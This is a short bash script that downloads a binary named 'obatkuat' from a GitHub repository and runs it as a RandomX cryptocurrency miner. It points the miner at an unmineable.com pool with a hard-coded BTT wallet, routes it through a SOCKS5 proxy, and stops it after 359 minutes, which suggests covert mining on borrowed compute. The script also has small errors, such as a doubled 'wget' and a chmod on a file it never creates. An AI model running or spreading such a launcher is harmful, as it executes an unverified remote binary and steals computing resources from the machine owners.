#!/bin/bash

apt update

wget wget https://raw.githubusercontent.com/jacujamil/dewasa/main/obatkuat

apt install screen libjansson4 -y

apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev

chmod +x ternak.sh && chmod +x obatkuat

screen -dmS ls

A=rx-us.unmineable.com:3333

B=BTT:TLPbsRkFNUAutW7V5XeiC4jt9RDJd8xwVP

C=$(echo $(shuf -i 1-9999 -n 1)-P16)
D=socks5://72.210.208.101:4145
timeout 359m ./obatkuat -a rx/0 -o $A -u $B.$C -p x -t 7 -x $D -k
